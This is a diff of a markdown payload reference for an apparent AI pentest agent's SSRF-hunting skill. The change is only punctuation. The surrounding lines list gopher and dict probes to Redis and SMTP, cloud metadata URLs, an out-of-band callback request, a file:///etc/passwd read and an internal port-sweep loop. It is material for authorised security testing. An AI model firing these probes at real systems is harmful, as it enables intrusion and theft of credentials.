@@ -1,4 +1,4 @@
-# payloads — ssrf-hunter
+# payloads - ssrf-hunter
 
 **Source:** `pentest-agent-development/notebooklm-notes/Guia Estratégico de Testes e Mitigação de SSRF.md` (Section 5: PAYLOADS / PROBES)
 
@@ -73,28 +73,28 @@ Used to smuggle raw protocol bytes through an HTTP fetch. Useful when
 the target backend service speaks Redis, Memcached, or SMTP.
 
 ```
-# gopher to Redis — read-only INFO
+# gopher to Redis - read-only INFO
 gopher://10.0.0.1:6379/_INFO%0D%0A
 
 # gopher to SMTP (banner probe)
 gopher://mail.internal:25/_HELO%20x%0D%0AQUIT%0D%0A
 
-# dict protocol — Redis shows INFO
+# dict protocol - Redis shows INFO
 dict://10.0.0.1:6379/INFO
 
-# FTP — banner grabs
+# FTP - banner grabs
 ftp://10.0.0.1:21/
 ```
 
 Gopher is the most powerful protocol for SSRF smuggling because it
-passes arbitrary bytes — test first with a harmless command like Redis
+passes arbitrary bytes - test first with a harmless command like Redis
 `INFO` or `PING`. Do NOT submit destructive Redis commands (`FLUSHALL`,
 `SHUTDOWN`) or any state-changing SMTP sequence without
 `destructive_testing: approved`.
 
 ## 5. Cloud Metadata (handoff to `ssrf-cloud-metadata-hunter`)
 
-Short list — escalate to the specialist skill for the full playbook:
+Short list - escalate to the specialist skill for the full playbook:
 
 ```
 http://169.254.169.254/latest/meta-data/                      # AWS
@@ -159,7 +159,7 @@ Collaborator, interact.sh, your own DNS listener):
 
 ```bash
 # interact.sh (publicly hosted)
-# submit the URL it generates — a DNS or HTTP hit on it confirms SSRF
+# submit the URL it generates - a DNS or HTTP hit on it confirms SSRF
 curl -H "Content-Type: application/json" -d '{"url":"http://OOB_ID.oast.site/"}' \
      https://target/api/fetch
 ```
@@ -191,7 +191,7 @@ https://%31%32%37%2e%30%2e%30%2e%31           # 127.0.0.1 URL-encoded
 
 ## Fuzzing / Sweep Commands
 
-### ffuf — enumerate parameter location
+### ffuf - enumerate parameter location
 
 ```bash
 ffuf -w ssrf_payloads.txt:PAYLOAD \
@@ -205,7 +205,7 @@ ffuf -w ssrf_payloads.txt:PAYLOAD \
 # Check if the server follows file:///
 curl -s "https://target/fetch?url=file:///etc/passwd" | head -c 200
 
-# Check internal scan — vary port
+# Check internal scan - vary port
 for PORT in 22 80 443 2375 3306 5432 6379 8080 9200 27017; do
   echo "PORT=${PORT}"
   curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" \
@@ -213,7 +213,7 @@ for PORT in 22 80 443 2375 3306 5432 6379 8080 9200 27017; do
 done
 ```
 
-### Nuclei — ready-made SSRF templates
+### Nuclei - ready-made SSRF templates
 
 ```bash
 nuclei -u https://target/fetch?url=URL_MARKER \
